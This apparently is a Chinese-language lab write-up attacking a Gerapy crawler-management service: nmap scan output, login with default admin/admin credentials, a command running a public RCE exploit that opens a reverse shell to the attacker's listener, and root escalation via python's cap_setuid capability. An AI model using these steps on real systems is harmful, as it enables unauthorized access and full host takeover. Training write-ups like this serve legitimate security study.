nmap 結果
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Fri, 20 Dec 2024 03:40:23 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html
|     Content-Length: 9979
|     Vary: Origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:top; padding:2px 3px; }
|     width:12em; text-align:right; color:#6
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 20 Dec 2024 03:40:17 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept, Origin
|     Allow: GET, OPTIONS
|     Content-Length: 2530
|_    <!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.ico><title>Gerapy</title><link href=/static/css/chunk-10b2edc2.79f68610.css rel=prefetch><link href=/static/css/chunk-12e7e66d.8f856d8c.css rel=prefetch><link href=/static/css/chunk-39423506.2eb0fec8.css rel=prefetch><link href=/static/css/chunk-3a6102b3.0fe5e5eb.css rel=prefetch><link href=/static/css/chunk-4a7237a2.19df386b.css rel=prefetch><link href=/static/css/chunk-531d1845.b0b0d9e4.css rel=prefetch><link href=/static/css/chunk-582dc9b0.d60b5161.css rel=prefetch><link href=/static/css/chun
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=12/19%Time=6764E721%P=aarch64-unknown-linu
SF:x-gnu%r(GetRequest,AAA,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2020\x
SF:20Dec\x202024\x2003:40:17\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPyth
SF:on/3\.10\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary:\x2
SF:0Accept,\x20Origin\r\nAllow:\x20GET,\x20OPTIONS\r\nContent-Length:\x202
SF:530\r\n\r\n<!DOCTYPE\x20html><html\x20lang=en><head><meta\x20charset=ut
SF:f-8><meta\x20http-equiv=X-UA-Compatible\x20content=\"IE=edge\"><meta\x2
SF:0name=viewport\x20content=\"width=device-width,initial-scale=1\"><link\
SF:x20rel=icon\x20href=/favicon\.ico><title>Gerapy</title><link\x20href=/s
SF:tatic/css/chunk-10b2edc2\.79f68610\.css\x20rel=prefetch><link\x20href=/
SF:static/css/chunk-12e7e66d\.8f856d8c\.css\x20rel=prefetch><link\x20href=
SF:/static/css/chunk-39423506\.2eb0fec8\.css\x20rel=prefetch><link\x20href
SF:=/static/css/chunk-3a6102b3\.0fe5e5eb\.css\x20rel=prefetch><link\x20hre
SF:f=/static/css/chunk-4a7237a2\.19df386b\.css\x20rel=prefetch><link\x20hr
SF:ef=/static/css/chunk-531d1845\.b0b0d9e4\.css\x20rel=prefetch><link\x20h
SF:ref=/static/css/chunk-582dc9b0\.d60b5161\.css\x20rel=prefetch><link\x20
SF:href=/static/css/chun")%r(FourOhFourRequest,1B34,"HTTP/1\.1\x20404\x20N
SF:ot\x20Found\r\nDate:\x20Fri,\x2020\x20Dec\x202024\x2003:40:23\x20GMT\r\
SF:nServer:\x20WSGIServer/0\.2\x20CPython/3\.10\.6\r\nContent-Type:\x20tex
SF:t/html\r\nContent-Length:\x209979\r\nVary:\x20Origin\r\n\r\n<!DOCTYPE\x
SF:20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20http-equiv=\"c
SF:ontent-type\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20<tit
SF:le>Page\x20not\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak</tit
SF:le>\n\x20\x20<meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\
SF:x20\x20<style\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20{\x2
SF:0padding:0;\x20margin:0;\x20}\n\x20\x20\x20\x20body\x20\*\x20{\x20paddi
SF:ng:10px\x2020px;\x20}\n\x20\x20\x20\x20body\x20\*\x20\*\x20{\x20padding
SF::0;\x20}\n\x20\x20\x20\x20body\x20{\x20font:small\x20sans-serif;\x20bac
SF:kground:#eee;\x20color:#000;\x20}\n\x20\x20\x20\x20body>div\x20{\x20bor
SF:der-bottom:1px\x20solid\x20#ddd;\x20}\n\x20\x20\x20\x20h1\x20{\x20font-
SF:weight:normal;\x20margin-bottom:\.4em;\x20}\n\x20\x20\x20\x20h1\x20span
SF:\x20{\x20font-size:60%;\x20color:#666;\x20font-weight:normal;\x20}\n\x2
SF:0\x20\x20\x20table\x20{\x20border:none;\x20border-collapse:\x20collapse
SF:;\x20width:100%;\x20}\n\x20\x20\x20\x20td,\x20th\x20{\x20vertical-align
SF::top;\x20padding:2px\x203px;\x20}\n\x20\x20\x20\x20th\x20{\x20width:12e
SF:m;\x20text-align:right;\x20color:#6");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

訪問他的 8000 port 是一個 gerapy 登入網站
![image](https://hackmd.io/_uploads/BJW4MjGrJg.png)

上網找看看有沒有預設帳密是 `admin` `admin` 成功登入
![image](https://hackmd.io/_uploads/SJ7iMjGSJe.png)

查了一下是一個幫助爬蟲的網站 下面有版本號 搜尋後找到一個 RCE 的 [CVE](https://www.exploit-db.com/exploits/50640)

跑起來就拿到 shell
```
python3 50640.py -t 192.168.200.24 -p 8000 -L 192.168.45.182 -P 4545
```

找到 local flag
![image](https://hackmd.io/_uploads/B1u5KofHJg.png)

放 linpeas.sh 上去看看 有找到一個有趣的東東 顏色也不同
```
/usr/bin/python3.10 cap_setuid=ep
```
![image](https://hackmd.io/_uploads/BkvX73MB1x.png)

這個可以用 `getcap -r / 2>/dev/null` 來查看(這些都是不需要完全 root 權限的情況下，執行一些特殊的操作（例如，綁定到低號端口或操作原本需要 root 權限的資源）。)

在 GTFOBIN 可以找到 有 python 能提權的 [這裡](https://gtfobins.github.io/gtfobins/python/#suid)
![image](https://hackmd.io/_uploads/rynvDnGBye.png)

成功提權
![image](https://hackmd.io/_uploads/H1qOwnfB1x.png)
